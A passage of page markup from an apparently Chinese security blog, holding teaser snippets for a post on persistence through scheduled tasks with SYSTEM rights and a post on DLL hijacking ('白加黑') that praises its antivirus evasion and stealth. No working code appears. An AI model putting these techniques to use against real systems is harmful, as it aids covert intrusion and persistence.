&#x3D; SYSTEM 权限） /u：登录用户名 /p：登录密码 /tn：任务名称 /sc：触发频率（DAILY &#x3D; 每天） /tr：要执行的程序路径 /f：强制创建（覆盖同名任务）  手动触发任务（测试用）： 1schtasks /r...</div></div></div></a><a class="pagination-related" href="/2026/02/13/cs3/" title="DLL 劫持技术实战（白加黑）"><img class="cover" src="/img/covers/shinchan-cover-03.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">DLL 劫持技术实战（白加黑）</div></div><div class="info-2"><div class="info-item-1">DLL 劫持原理什么是 DLL 劫持DLL 劫持（DLL Hijacking）是一种利用 Windows DLL 搜索顺序机制的攻击技术。当应用程序调用 LoadLibrary() 或 LoadLibraryEx() 加载 DLL 时，如果未指定完整路径，Windows 会按照预定义的搜索顺序查找 DLL 文件。攻击者可以在优先级更高的目录中放置恶意 DLL，使系统加载恶意代码而非合法 DLL。 白加黑技术白加黑（Living off the Land） 是指利用合法的、已签名的可执行文件（白文件）加载恶意 DLL（黑文件），从而绕过安全软件的检测。这种技术的优势在于：  信任链利用：合法程序通常具有数字签名，被安全软件信任 行为隐蔽：恶意行为由合法进程执行，难以被行为检测识别 免杀效果好：不需要修改白文件，只需替换 DLL 持久化简单：可以通过快捷方式、计划任务等方式持久化   Windows DLL 搜索顺序标准搜索顺序当应用程序调用 LoadLibrary(&quot;example.dll&quot;) 时，Windows 按以下顺序搜索 DLL：  应用程序所在目录（最...</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div></div></body></html>
